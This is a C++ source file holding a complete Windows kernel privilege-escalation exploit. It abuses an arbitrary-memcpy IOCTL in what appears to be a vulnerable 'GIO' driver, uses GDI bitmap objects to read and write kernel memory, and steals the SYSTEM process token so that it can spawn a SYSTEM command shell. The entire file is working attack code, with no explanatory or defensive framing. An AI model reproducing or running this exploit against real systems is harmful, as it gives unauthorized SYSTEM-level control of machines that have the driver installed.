#include <iostream>
#include <Windows.h>
#include <assert.h>
#include <Psapi.h>
using namespace std;

#define IOCTL_GIO_MEMCPY 0xC3502808

HBITMAP hManager = NULL;
HBITMAP hWorker = NULL;
HANDLE ghDriver = INVALID_HANDLE_VALUE;
DWORD64 ActiveProcessLinksOffset = 0x188;
DWORD64 TokenOffset = 0x208;
DWORD64 UniqueProcessIdOffset = 0x180;

#pragma pack(push, 1)
typedef struct _GIO_MemCpyStruct {
	DWORD64 dest;
	DWORD64 src;
	size_t size;
}GIO_MemCpyStruct;
#pragma pack(pop)

DWORD64 GetGdi() {
	const DWORD64 Teb = reinterpret_cast<DWORD64>(NtCurrentTeb());
	DWORD64 Peb = *reinterpret_cast<DWORD64*>(Teb + 0x60);
	DWORD64 Gdi = *reinterpret_cast<DWORD64*>(Peb + 0x0f8);
	return Gdi;
}

DWORD64 KernelAddress(HBITMAP hBitmap) {
	DWORD64 cell = *reinterpret_cast<DWORD64*>(GetGdi() + LOWORD(hBitmap) * 0x18);
	return cell;
}

VOID WriteAddress(DWORD64 Address, DWORD64 Value) {
	SetBitmapBits(hManager, sizeof(DWORD64), &Address);
	SetBitmapBits(hWorker, sizeof(DWORD64), &Value);
}

VOID ReadAddress(DWORD64 Address, BYTE * buf, DWORD64 len) {
	SetBitmapBits(hManager, sizeof(DWORD64), &Address);
	GetBitmapBits(hWorker, len, buf);
}

ULONG64 GetNTOsBase() {
	ULONG64 Bases[0x1000];
	DWORD needed = 0;
	ULONG64 krnlbase = 0;
	if (EnumDeviceDrivers((LPVOID*)& Bases, sizeof(Bases), &needed)) {
		krnlbase = Bases[0];
	}
	return krnlbase;
}

DWORD64 PsInitialSystemProcess() {
	DWORD64 ntos = (DWORD64)LoadLibrary("ntoskrnl.exe");
	DWORD64 addr = (DWORD64)GetProcAddress((HMODULE)ntos, "PsInitialSystemProcess");
	FreeLibrary((HMODULE)ntos);
	DWORD64 res = 0;
	DWORD64 ntOsBase = GetNTOsBase();
	if (ntOsBase) {
		ReadAddress(addr - ntos + ntOsBase, (BYTE*)& res, sizeof(DWORD64));
	}
	return res;
}

DWORD64 PsGetCurrentProcess() {
	DWORD64 pEPROCESS = PsInitialSystemProcess();

	LIST_ENTRY ActiveProcessLinks;
	DWORD64 MyLink;

	ReadAddress(pEPROCESS + UniqueProcessIdOffset + sizeof(DWORD64), (BYTE*)& ActiveProcessLinks, sizeof(LIST_ENTRY));

	DWORD64 res = 0;

	while (TRUE) {
		DWORD64 UniqueProcessId = 0;
		pEPROCESS = (ULONG64)(ActiveProcessLinks.Flink) - UniqueProcessIdOffset - sizeof(DWORD64);

		ReadAddress(pEPROCESS + UniqueProcessIdOffset, (BYTE*)& UniqueProcessId, sizeof(DWORD64));

		if (GetCurrentProcessId() == UniqueProcessId) {
			res = pEPROCESS;
			break;
		}

		ReadAddress(pEPROCESS + UniqueProcessIdOffset + sizeof(DWORD64), (BYTE*)& ActiveProcessLinks, sizeof(LIST_ENTRY));

		if (pEPROCESS == (DWORD64)(ActiveProcessLinks.Flink) - UniqueProcessIdOffset - sizeof(DWORD64))
			break;
	}
	return res;
}

BOOL SetHandle() {
	ghDriver = CreateFile("\\\\.\\GIO", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, (HANDLE)NULL);
	if (ghDriver == INVALID_HANDLE_VALUE) {
		cout << "[-] CreateFileA Failed.\n";
		return false;
	}
	cout << "[+] Opened handle to device with value 0x" << hex << ghDriver << endl;
	return true;
}

VOID SetGdiHandles() {
	CHAR buf[0x64 * 0x64 * 4];
	hManager = CreateBitmap(0x64, 0x64, 1, 32, &buf);
	hWorker = CreateBitmap(0x64, 0x64, 1, 32, &buf);
	if (hManager == NULL || hWorker == NULL) {
		cout << "[-] CreateBitmap Failed.\n";
		exit(-1);
	}

	DWORD64 hManagerKernelAddress = KernelAddress(hManager);
	DWORD64 hWorkerKernelAddress = KernelAddress(hWorker);

	DWORD64 ManagerPvScan0 = hManagerKernelAddress + 0x50;
	DWORD64 WorkerPvScan0 = hWorkerKernelAddress + 0x50;
	
	GIO_MemCpyStruct inBuffer = { 0 };
	inBuffer.dest = ManagerPvScan0;
	inBuffer.src = (DWORD64)& WorkerPvScan0;
	inBuffer.size = 0x8;

	CHAR outBuffer[0x30] = { 0 };
	DWORD retBytes = 0x0;
	assert(ghDriver != INVALID_HANDLE_VALUE, "ghDriver has not been initialized.\n");
	DeviceIoControl(ghDriver, IOCTL_GIO_MEMCPY, reinterpret_cast<LPVOID>(&inBuffer), sizeof(GIO_MemCpyStruct),
		reinterpret_cast<LPVOID>(&outBuffer), sizeof(outBuffer), &retBytes, static_cast<LPOVERLAPPED>(0x0));
}

int main(int argc, char* argv[]) {
	if (!SetHandle()) {
		cout << "[-] SetHandle Failed.\n";
		exit(-1);
	}

	SetGdiHandles();

	ULONG64 SystemEPROCESS = PsInitialSystemProcess();

	ULONG64 CurrentEPROCESS = PsGetCurrentProcess();

	ULONG64 SystemToken = 0;

	ReadAddress(SystemEPROCESS + TokenOffset, (BYTE*)& SystemToken, sizeof(DWORD64));

	WriteAddress(CurrentEPROCESS + TokenOffset, (DWORD64)SystemToken);
	system("cmd.exe");

	return 0;
}